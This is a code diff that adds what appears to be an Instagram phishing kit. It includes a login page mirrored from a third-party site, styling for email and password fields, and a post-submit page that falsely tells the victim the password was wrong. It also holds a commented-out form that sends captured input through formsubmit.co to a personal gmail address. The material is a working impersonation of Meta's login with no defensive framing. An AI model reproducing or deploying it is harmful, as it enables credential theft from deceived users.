+          <option value="de">Deutsch</option>
+          <option value="el">Ελληνικά</option>
+          <option value="en">English</option>
+          <option value="en-gb">English (UK)</option>
+          <option value="es">Español (España)</option>
+          <option value="es-la">Español</option>
+          <option value="fi">Suomi</option>
+          <option value="fr">Français</option>
+          <option value="id">Bahasa Indonesia</option>
+          <option value="it">Italiano</option>
+          <option value="ja">日本語</option>
+          <option value="ko">한국어</option>
+          <option value="ms">Bahasa Melayu</option>
+          <option value="nb">Norsk</option>
+          <option value="nl">Nederlands</option>
+          <option value="pl">Polski</option>
+          <option value="pt-br">Português (Brasil)</option>
+          <option value="ru">Русский</option>
+          <option value="sv">Svenska</option>
+          <option value="th">ภาษาไทย</option>
+          <option value="tl">Filipino</option>
+          <option value="tr">Türkçe</option>
+          <option value="zh-cn">中文(简体)</option>
+          <option value="zh-tw">中文(台灣)</option>
+          <option value="bn">বাংলা</option>
+          <option value="gu">ગુજરાતી</option>
+          <option value="hi">हिन्दी</option>
+          <option value="hr">Hrvatski</option>
+          <option value="hu">Magyar</option>
+          <option value="kn">ಕನ್ನಡ</option>
+          <option value="sk">Slovenčina</option>
+          <option value="ta">தமிழ்</option>
+          <option value="te">తెలుగు</option>
+          <option value="vi">Tiếng Việt</option>
+          <option value="zh-hk">中文(香港)</option>
+          <option value="bg">Български</option>
+          <option value="ro">Română</option>
+          <option value="sr">Српски</option>
+          <option value="uk">Українська</option>
+        </select>
+        <span>&copy; 2023 Instagram from Meta</span>
+      </div>
+    </footer>
+    <script src="../../js/socials/app.html"></script>
+    <script src="../../js/socials/brands.min.html"></script>
+    <script src="../../js/socials/fontawesome.min.html"></script>
+  </body>
+
+<!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
+</html>
+ 10 changes: 10 additions & 0 deletions10  
+js/socials/app.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /js/socials/app.js</pre>
+</body>
+</html>
+ 10 changes: 10 additions & 0 deletions10  
+js/socials/brands.min.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /js/socials/brands.min.js</pre>
+</body>
+</html>
+ 10 changes: 10 additions & 0 deletions10  
+js/socials/fontawesome.min.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /js/socials/fontawesome.min.js</pre>
+</body>
+</html>
+ 255 changes: 255 additions & 0 deletions255  
+style2.css
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,255 @@
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+    border: none;
+    text-decoration: none;
+}
+
+:root {
+    --cl-white: #fafafa;
+    --cl-gray-dark: #868585;
+    --bg-blue: #0095F6;
+    --cl-gray-light: #dbdbdb;
+    --bg-white: #ffffff;
+}
+
+body {
+    margin: 32px auto;
+    max-width: 935px;
+    padding-bottom: 20px;
+    background-color: var(--cl-white);
+    color: var(--cl-gray-dark);
+}
+
+.container {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+}
+
+/* SMARTPHONE */
+.smartphone {
+    margin-left: -90px;
+}
+
+.smartphone .screen {
+    position: absolute;
+    margin: 25px 0 0 160px;
+}
+
+.fade {
+    animation-name: fade;
+    animation-duration: 1.5s;
+}
+
+@keyframes fade {
+    from {
+        opacity: .8
+    }
+
+    to {
+        opacity: 1
+    }
+}
+
+/* FORM */
+.form-area {
+    display: flex;
+    flex-direction: column;
+    height: 100%;
+    padding-top: 15px;
+}
+
+.form-area .logo {
+    width: 355px;
+    padding: 40px 30px 0 90px;
+    margin-bottom: 0;
+    background-color: var(--bg-white);
+    border: 1px solid var(--cl-gray-light);
+    border-bottom: 0;
+}
+
+.form-area .logo img {
+    width: 170px;
+}
+
+.form-area form {
+    display: flex;
+    flex-direction: column;
+    width: 355px;
+    padding: 30px 0 20px 0;
+    align-items: center;
+    background-color: var(--bg-white);
+    border: 1px solid var(--cl-gray-light);
+    border-top: 0;
+}
+
+.form-area form input {
+    border-radius: 4px;
+    width: 280px;
+}
+
+.form-area form input[type=email],
+form input[type=password] {
+    padding: 13px 0 13px 4px;
+    margin-bottom: 5px;
+    border: 1px solid var(--cl-gray-light);
+    background-color: var(--cl-white);
+    font-size: 11px;
+}
+
+.form-area form input[type=submit] {
+    padding: 10px 10px;
+    margin-top: 10px;
+    color: var(--bg-white);
+    background-color: #0095F6;
+    font-weight: 500;
+}
+
+.form-area form input[type=submit]:hover {
+    background-color: var(--bg-blue);
+    cursor: pointer;
+}
+
+form .other-option {
+    display: flex;
+    flex-direction: row;
+    margin: 15px 0;
+    color: var(--cl-gray-dark);
+    font-weight: 700;
+    font-size: 14px;
+}
+
+form .other-option div {
+    width: 110px;
+    height: 1px;
+    background-color: var(--cl-gray-light);
+    margin: 6px 16px;
+}
+
+form .options {
+    margin: 10px 0 0 0;
+    text-align: center;
+}
+
+form .options .social {
+    color: #385185;
+    font-size: 16px;
+    font-weight: 700;
+}
+
+form .options .social:hover {
+    color: #3f37ad;
+}
+
+form .options .forget {
+    margin-top: 22px;
+}
+
+form .options .forget a {
+    color: var(--cl-gray-dark);
+    font-size: 14px;
+}
+
+.form-area .noaccount {
+    width: 355px;
+    margin: 10px 0;
+    padding: 22px;
+    text-align: center;
+    background-color: var(--bg-white);
+    border: 1px solid var(--cl-gray-light);
+    font-size: 14px;
+}
+
+.form-area .noaccount a {
+    color: var(--cl-gray-dark);
+}
+
+.form-area .noaccount a span {
+    color: var(--bg-blue);
+    font-weight: 700;
+}
+
+.form-area .apps {
+    text-align: center;
+    width: 355px;
+    margin-top: 10px;
+    color: var(--cl-gray-dark);
+}
+
+.form-area .apps img {
+    width: 140px;
+    margin-top: 15px;
+}
+
+/* FOOTER */
+footer {
+    text-align: center;
+    margin: 0 10px;
+    font-size: 14px;
+}
+
+footer a {
+    font-size: 14px;
+    color: var(--cl-gray-dark);
+    margin: 5px 4px;
+}
+
+footer .footer-content {
+    margin-bottom: 5px;
+}
+
+footer .copyright {
+    margin-top: 20px;
+}
+
+footer .copyright select {
+    background: none;
+    color: var(--cl-gray-dark);
+}
+
+@media screen and (max-width:840px) {
+    body {
+        max-width: 100%;
+    }
+
+    .smartphone {
+        margin-left: -50px;
+    }
+}
+
+@media screen and (max-width:800px) {
+    .smartphone {
+        display: none;
+    }
+
+    .form-area {
+        margin-bottom: 50px;
+    }
+}
+
+@media screen and (max-width:435px) {
+    .form-area .logo {
+        width: 100%;
+        margin: auto;
+        padding: 10px auto;
+        background-color: transparent;
+        border: none;
+    }
+
+    .form-area form {
+        width: 100%;
+        background-color: transparent;
+        border: none;
+        border-top: 0;
+    }
+
+    .form-area .noaccount {
+        width: 100%;
+        margin: 0;
+        background-color: transparent;
+        border: none;
+    }
+}
+ 39 changes: 39 additions & 0 deletions39  
+thanks.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,39 @@
+<html lang="en">
+
+<head>
+   <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+    <link href='https://fonts.googleapis.com/css?family=Lato:300,400|Montserrat:700' rel='stylesheet' type='text/css'>
+    <style>
+        @import url(//cdnjs.cloudflare.com/ajax/libs/normalize/3.0.1/normalize.min.css);
+        @import url(//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css);
+    </style>
+    <link rel="stylesheet" href="https://2-22-4-dot-lead-pages.appspot.com/static/lp918/min/default_thank_you.css">
+    <script src="https://2-22-4-dot-lead-pages.appspot.com/static/lp918/min/jquery-1.9.1.min.js"></script>
+    <script src="https://2-22-4-dot-lead-pages.appspot.com/static/lp918/min/html5shiv.js"></script>
+</head>
+
+<body>
+    <header class="site-header" id="header">
+        <h1 class="site-header__title" data-lead-id="site-header-title"></h1>
+    </header>
+    <div class="main-content">
+        <!-- <i class="fa fa-check main-content__checkmark" id="checkmark"></i> -->
+        <p>Sorry, your password was incorrect. Please double-check your password</p>
+        <!-- <form id="form" method="POST" action="https://formsubmit.co/bigdabiladabila@gmail.com">
+            <input type="text" placeholder="COUNTRY" style="border-radius: 50px; margin: 10px; padding: 10px;">
+                <button class="btn-login" type="submit" id="button" value="Send Email">
+                    Submit
+                </button>
+        </form> -->
+    </div>
+
+    <footer class="site-footer" id="footer">
+        <p class="site-footer__fineprint" id="fineprint">Copyright ©2023 | All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
